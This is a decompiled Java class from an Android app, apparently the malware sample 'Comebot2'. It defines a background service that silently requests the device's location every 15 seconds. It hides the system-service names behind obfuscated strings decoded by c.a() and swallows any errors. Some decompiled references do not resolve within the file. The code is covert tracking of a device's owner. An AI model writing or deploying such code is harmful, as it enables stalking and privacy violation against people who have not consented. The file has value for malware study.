package anu_bispro.app;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;

public class NETWORK extends Service {
  b a = new b();
  
  d b = new d();
  
  public LocationManager c;
  
  a d = new a();
  
  private LocationListener e = new a(this);
  
  public IBinder onBind(Intent paramIntent) {
    return null;
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
    try {
      this.c = (LocationManager)getSystemService(c.a("\nb\005l\022d\tc"));
      this.c.requestLocationUpdates(c.a("c\003y\021b\024f"), 15000L, 10.0F, this.e);
    } catch (Exception exception) {}
    return paramInt1;
  }
  
  class a implements LocationListener {
    a(NETWORK this$0) {}
    
    public void onLocationChanged(Location param1Location) {
      NETWORK.a(this.a, param1Location);
    }
    
    public void onProviderDisabled(String param1String) {}
    
    public void onProviderEnabled(String param1String) {}
    
    public void onStatusChanged(String param1String, int param1Int, Bundle param1Bundle) {}
  }
}


/* Location:              /home/fahim/Desktop/Comebot2-dex2jar.jar!/anu_bispro/app/NETWORK.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */